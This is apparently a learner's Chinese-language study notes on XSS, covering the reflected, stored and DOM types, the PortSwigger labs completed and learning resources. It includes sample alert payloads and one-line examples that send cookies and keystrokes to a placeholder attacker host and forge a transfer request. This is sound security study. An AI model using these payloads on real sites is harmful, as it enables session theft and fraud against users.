# Day 10: XSS 跨站脚本攻击 (2026-07-22)

## XSS 三种类型

### 反射型 XSS (Reflected)
- 恶意脚本在 **URL** 里
- 服务器把用户输入原样"反射"回浏览器
- 受害方式：攻击者发链接 → 受害者点击 → 浏览器执行
- Payload: `?search=<script>alert(1)</script>`

### 存储型 XSS (Stored)
- 恶意脚本存在 **数据库** 里
- 服务器从数据库取出数据拼进页面返回
- 受害方式：所有访问该页面的人都自动中招（比如评论区）
- 最危险的一种

### DOM 型 XSS (DOM-based)
- 恶意脚本在 URL `#` 后面（不发给服务器）
- 浏览器本地的 JS 代码从 URL 取出恶意内容，塞进 DOM 树
- 漏洞在客户端 JS 代码，不在服务端
- Payload: `x" onerror=alert(1)` / `"><svg onload=alert(1)>`

## 三种类型对比

| 类型 | 恶意代码存储位置 | 谁把它取出来执行 |
|------|-----------------|-----------------|
| 反射型 | URL `?` 后面 | 服务器 |
| 存储型 | 数据库 | 服务器 |
| DOM 型 | URL `#` 后面 | 浏览器本地 JS |

## 实际危害

不仅仅是弹广告，本质是攻击者的 JS 在受害者浏览器里执行：

1. **偷 Cookie → 盗号**: `fetch('http://攻击者/?c=' + document.cookie)`
2. **伪造请求 → 替用户操作**: `fetch('/transfer?to=攻击者&amount=10000')`
3. **钓鱼弹窗 → 骗密码**: `prompt('请输入密码')`
4. **记录键盘输入**: `document.onkeypress = e => fetch('http://攻击者/?k=' + e.key)`
5. **网页挂马**: 加载外部 exploit 脚本

XSS 攻击成功后 = 你在那个网站上的眼睛和手全变成攻击者的。

## PortSwigger Labs 完成

- [x] Reflected XSS into HTML context with nothing encoded
- [x] Stored XSS into HTML context with nothing encoded
- [x] DOM XSS in document.write sink using source location.search

## 资源

- B站: 技术蛋老师 XSS视频 (BV1rg411v7B8) - OWASP漏洞讲解合集
- PortSwigger Academy: https://portswigger.net/web-security/cross-site-scripting
- Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
